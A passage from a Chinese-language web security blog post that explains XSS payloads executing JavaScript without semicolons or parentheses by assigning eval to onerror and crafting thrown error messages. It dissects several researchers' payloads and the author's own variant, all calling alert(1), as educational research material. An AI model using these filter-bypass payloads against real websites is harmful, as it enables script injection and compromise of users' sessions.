+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror<span class="token operator">=</span>alert<span class="token punctuation">;</span>
+<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// Error: 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>由於 <code>Label:</code> 在 JavaScript 是個合法的程式碼，所以後面直接放程式碼就好，輕輕鬆鬆：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror<span class="token operator">=</span>eval<span class="token punctuation">;</span>
+<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'alert(1)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>但用了 <code>Error()</code> 的話就有括號了，而 Gareth Heyes 的第二個發現是，在 Firefox 上你可以 throw 一個 error-like object，也能達到相同效果：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror<span class="token operator">=</span>eval<span class="token punctuation">;</span>
+<span class="token keyword">throw</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">lineNumber</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token literal-property property">columnNumber</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token literal-property property">fileName</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token literal-property property">message</span><span class="token operator">:</span><span class="token string">'alert\x281\x29'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>總而言之呢，這些都是為了要控制 Firefox 最後產生的錯誤訊息，只要能控制，就能組成合法程式碼丟到 eval 去執行。</p>
+<p>剛好最近看到 Gareth Heyes <a target="_blank" rel="noopener" href="https://x.com/garethheyes/status/1961078705293246513">發推</a>，說 Firefox 要把這個功能修掉了：<a target="_blank" rel="noopener" href="https://github.com/PortSwigger/xss-cheatsheet-data/issues/103">Firefox removed support for throwing error-like objects</a>，於是他就找出了一個新的方法：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">throw</span> onerror<span class="token operator">=</span>eval<span class="token punctuation">,</span>x<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">,</span>x<span class="token punctuation">.</span>message<span class="token operator">=</span><span class="token string">'alert\x281\x29'</span><span class="token punctuation">,</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>看起來是要 new Error 的話，不需要括號也可以。有了一個 Error 物件之後再設定 message，就一樣能控制錯誤訊息。</p>
+<h2><span id="其他-payload">其他 payload</span></h2><p>原文底下有其他人提了另外兩個 payload。</p>
+<p>第一個來自 <a target="_blank" rel="noopener" href="https://x.com/terjanq/status/1128692453047975936">@terjanq</a>：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">throw</span><span class="token operator">/</span>a<span class="token operator">/</span><span class="token punctuation">,</span>Uncaught<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>g<span class="token operator">=</span>alert<span class="token punctuation">,</span>a<span class="token operator">=</span><span class="token constant">URL</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span>onerror<span class="token operator">=</span>eval<span class="token punctuation">,</span><span class="token operator">/</span><span class="token number">1</span><span class="token operator">/</span>g<span class="token operator">+</span>a<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">1337</span><span class="token punctuation">,</span><span class="token number">3331</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token operator">+</span>a<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>這個 payload 我試了一下目前只能在 Chrome 執行，很明顯可以拆成幾個部分：</p>
+<ol>
+<li><code>/a/</code></li>
+<li><code>Uncaught=1</code></li>
+<li><code>g=alert</code></li>
+<li><code>a=URL+0</code></li>
+<li><code>onerror=eval</code></li>
+<li><code>throw /1/g+a[12]+[1337,3331,117]+a[13]</code></li>
+</ol>
+<p>因為是用逗號接起來的，所以 throw 的會是最後的那一段。</p>
+<p>先從最後一段開始好了，這個 <code>throw /1/g+a[12]+[1337,3331,117]+a[13]</code> 是幹嘛的。</p>
+<p>首先呢，a 是 <code>URL+0</code>，而 URL 是個 global 的函式，函式 + 0 會變字串，所以 a 是 <code>&quot;function URL() &#123; [native code] &#125;0&quot;</code>，因此 <code>a[12]</code> 跟 <code>a[13]</code> 分別就是 <code>(</code> 跟 <code>)</code> 了。</p>
+<p>而 <code>/1/g</code> 是個 regexp，變成字串的時候會是 <code>&quot;/1/g&quot;</code>。至於 <code>[1337,3331,117]</code> 這個陣列，變字串時會呼叫 join，結果就是 <code>&quot;1337,3331,117&quot;</code>。</p>
+<p>結合在一起，<code>/1/g+a[12]+[1337,3331,117]+a[13]</code> 就會是 <code>/1/g(1337,3331,117)</code>。</p>
+<p>再搭配前面講過的，throw 什麼錯誤訊息就會是什麼，產生的錯誤訊息為：</p>
+<pre class="line-numbers language-none"><code class="language-none">Uncaught &#x2F;1&#x2F;g(1337,3331,117)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>這邊的 <code>/</code> 雖然之前是當作 regexp，可是在現在的程式碼中，其實是算數的除法，也就是 <code>a / b / c</code>，其中 a 是 <code>Uncaught</code>，b 是 <code>1</code>，c 是 <code>g(1337,3331,117)</code>。</p>
+<p>而 <code>Uncaught</code> 如果沒宣告就會出錯，所以才需要 <code>Uncaught=1</code>，接著 g 會被當成函式執行，因此 <code>g=alert</code>。</p>
+<p>那最前面的 <code>/a/</code> 呢？這個應該只是不想讓 <code>throw</code> 跟後面的 payload 有空格所以才加的，實際上沒其他作用。</p>
+<p>這個解法的精華在於 throw 的時候讓錯誤訊息變成 <code>Uncaught /1/g(1337,3331,117)</code>，是一段合法的程式碼，只要把一些前提補齊，就可以成功呼叫 <code>g</code> 這個函式。</p>
+<p>第二個來自 <a target="_blank" rel="noopener" href="https://x.com/cgvwzq">@cgvwzq</a>：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'=/'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">[</span>onerror<span class="token operator">=</span>eval<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'/-alert(1)//'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>這邊其實分成兩句，第一句是：<code>TypeError.prototype.name =&#39;=/&#39;</code>，這句是把 TypeError 的名稱強制修改成 <code>=/</code>。</p>
+<p>如果沒有這一句的話，<code>0[0][&#39;test&#39;]</code> 的錯誤訊息是：<code>Uncaught TypeError: Cannot read properties of undefined (reading &#39;test&#39;)</code></p>
+<p><code>0[0]</code> 會是 undefined，而 <code>undefined[&#39;test&#39;]</code> 就會拋出這個 TypeError。</p>
+<p>當我們強制把 name 改掉以後：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'hello!'</span><span class="token punctuation">;</span>
+<span class="token number">0</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token comment">// Uncaught hello!: Cannot read properties of undefined (reading 'test')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>就可以控制原本 <code>TypeError</code> 的部分，變成任意字串。</p>
+<p>而另外一句 <code>0[onerror=eval][&#39;/-alert(1)//&#39;]</code>，<code>0[onerror=eval]</code> 其實就只是把賦值放在 <code>[]</code> 裡面，賦值以後等同於 <code>0[eval]</code>，這個會回傳 undefined，於是就會拋一個 TypeError 出來。</p>
+<p>換個方式看好了，底下程式碼：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'&#123;1&#125;'</span><span class="token punctuation">;</span>
+<span class="token number">0</span><span class="token punctuation">[</span>eval<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'&#123;2&#125;'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>在 Chrome 上會產生的錯誤訊息為：</p>
+<pre class="line-numbers language-none"><code class="language-none">Uncaught &#123;1&#125;: can&#39;t access property &quot;&#123;2&#125;&quot;, 0[eval] is undefined<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>現在的問題就變成，該怎麼透過控制上面的字串，讓錯誤訊息變成合法的程式碼？</p>
+<p>在 <code>&#123;1&#125;</code> 的地方作者放了 <code>=/</code>，合起來就是 <code>Uncaught=/</code>，這個 <code>/</code> 其實是 regexp 的意思，因此這個方法的思路為，讓 <code>&#123;2&#125;</code> 前面那一堆字串（<code>: can&#39;t access property &quot;</code>）都變成 regexp 的一部分。</p>
+<p>因此 <code>&#123;2&#125;</code> 的地方開頭為 <code>/</code>，把前面湊成一個 regexp，接著用 <code>-alert(1)</code> 去執行函式，這邊改成 <code>+alert(1)</code> 也行，就只是要把兩個操作串起來而已。執行完以後，後面的程式碼全都用 <code>//</code> 註解掉，就可以不用管了。</p>
+<p>但如果你實際去跑上面這段 payload，會發現 Chrome 回傳錯誤訊息：<code>Invalid regular expression ... Unterminated group</code>，這是因為錯誤訊息裡面有個 <code>(</code>，那時可能還沒有，造成 regexp 語法有誤，只需要加個 <code>)</code> 就行了：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'=/'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">[</span>onerror<span class="token operator">=</span>eval<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">')/-alert(1)//'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>產生的錯誤訊息就會是：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Uncaught <span class="token operator">=</span><span class="token operator">/</span><span class="token operator">:</span> Cannot read properties <span class="token keyword">of</span> <span class="token keyword">undefined</span> <span class="token punctuation">(</span>reading <span class="token string">')/-alert(1)//'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>稍微簡化一下就是：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Uncaught <span class="token operator">=</span><span class="token operator">/</span>regexp<span class="token operator">/</span><span class="token operator">-</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//...</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>話說這個 payload 在 Chrome 139 上沒問題，Firefox 142 則會報錯：<code>Uncaught SyntaxError: expected expression, got &#39;=&#39;</code>。</p>
+<p>想要 debug 的話，把 <code>onerror=eval</code> 改成 <code>onerror=console.log</code> 就好，先看一下產生的錯誤訊息長怎樣：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x3D;&#x2F;: can&#39;t access property &quot;)&#x2F;&#x2F;alert(1)&#x2F;&#x2F;&quot;, 0[console.log] is undefined<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>看來 Firefox 上，TypeError 的 name 前面沒有任何東西，因此要讓 Firefox 可以動的話，前面隨便加個可以當變數的字元就行：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'a=/'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">[</span>onerror<span class="token operator">=</span>eval<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'/-alert(1)//'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>若是真的有理解這個做法，只要延續這個思路，其實在 TypeName 那邊就可以插入程式碼了，結果是一樣的，但帥氣度沒這麼高（在 Chrome 上沒問題）：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'=alert(1)//'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">[</span>onerror<span class="token operator">=</span>eval<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>至於要怎麼組出一個 Chrome 跟 Firefox 都可以的 payload，讀者可以自行練習，或是參考我組出來的一個範例，多加了一些變形：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'+/['</span><span class="token punctuation">,</span><span class="token punctuation">[</span>onerror<span class="token operator">=</span>eval<span class="token punctuation">]</span><span class="token punctuation">[</span>window<span class="token punctuation">.</span>Uncaught<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">']/-alert\501\51&lt;!--'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2><span id="總結">總結</span></h2><p>其實不管是哪個 payload，核心概念都是相同的，只要把錯誤訊息變成合法的 JavaScript 程式碼，再丟給 eval 執行即可。</p>
+<p>要看懂 payload，無非就是要對 JavaScript 程式碼比較熟悉，例如說 <code>0[onerror=eval]</code> 或是逗號的用法，至少要知道在幹嘛。</p>
+<p>除此之外，就是發揮想像力了，這個就比較難練習，通常都會從觀察模仿開始。</p>
+<p>最後整理幾個關鍵點：</p>
+<ol>
+<li>逗號可以串連多個 expression，會回傳最後一個</li>
+<li>把 onerror 換成 eval，就能把錯誤訊息當程式碼執行</li>
+<li>throw 出去的錯誤會變成錯誤訊息的一部分</li>
+<li>只要能讓錯誤訊息變成合法程式碼就大功告成</li>
+</ol>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/JavaScript/">#JavaScript</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-prev">
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2025/04/23/everyone-need-a-http-proxy-to-debug/">人人都需要一個 HTTP proxy 來 debug</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">評論</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2025 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>繁體中文</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2025/09/15/en/xss-without-semicolon-and-parentheses/" class="dropdown-item">
+                    English
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
